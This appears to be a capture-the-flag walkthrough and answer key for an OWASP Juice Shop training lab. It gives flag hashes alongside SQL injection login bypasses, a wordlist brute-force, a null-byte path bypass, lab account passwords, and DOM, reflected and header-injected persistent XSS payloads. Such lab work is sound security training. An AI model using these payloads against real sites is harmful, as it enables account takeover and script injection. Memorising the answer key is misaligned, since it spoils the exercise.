# Let's go on an adventure!

### What's the Administrator's email address?
> *Answer:* admin@juice-sh.op

### What parameter is used for searching?
```
/#/search?q
```
> *Answer:* q

### What show does Jim reference in his review?
> *Answer:* Star Trek


<br><br>
# Inject the juice

### Log into the administrator account!
```
email: ' or 1=1--
password: a
```
> *Answer:* 32a5e0f21372bcc1000a6088b93b458e41f0e02a

### Log into the Bender account!
```
email: bender@juice-sh.op'--
password: a
```
> *Answer:* fb364762a3c102b2db932069c0e6b78e738d4066


<br><br>
# Who broke my lock?!

### Bruteforce the Administrator account's password!
Use Burp Suite and best1050.txt. Got password: admin123
> *Answer:* c2110d06dc6f81c67cd8099ff0ba601241f1ac0e

### Reset Jim's password!
Jim's security question is set to "Your eldest siblings middle name?". (answer: Samuel)
> *Answer:* 094fbc9b48e525150ba97d05b942bbf114987257


<br><br>
# AH! Don't look!

### Access the Confidential Document!
> *Answer:* edf9281222395a1c5fee9b89e32175f1ccf50c5b

### Log into MC SafeSearch's account!
```
email: mc.safesearch@juice-sh.op
password: Mr. N00dles
```
> *Answer:* 66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0

### Download the Backup file!
```
/ftp/package.json.bak%2500.md
```
> *Answer:* bfc1e6b4a16579e85e06fee4c36ff8c02fb13795


<br><br>
# Who's flying this thing?

### Access the administration page!
```
/#/administration
```
> *Answer:* 946a799363226a24822008503f5d1324536629a0

### View another user's shopping basket!
> *Answer:* 41b997a36cc33fbe4f0ba018474e19ae5ce52121

### Remove all 5-star reviews!
> *Answer:* 50c97bcce0b895e446d61c83a21df371ac2266ef


<br><br>
# Where did that come from?

### Perform a DOM XSS!
```
/#/search?q=<iframe src="javascript:alert(`xss`)">
```
> *Answer:* 9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf

### Perform a persistent XSS!
Use Burp intercept to catch the logout request.<br>
If header request has "GET: /rest/saveLoginIp HTTP/1.1", then add:
```
True-Client-IP: <iframe src="javascript:alert(`xss`)">
```
> *Answer:* 149aa8ce13d7a4a8a931472308e269c94dc5f156

### Perform a reflected XSS!
```
/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```
> *Answer:* 23cefee1527bde039295b2616eeb29e1edc660a0


<br><br>
# Exploration!

### Access the /#/score-board/ page
> *Answer:* 7efd3174f9dd5baa03a7882027f2824d2f72d86e

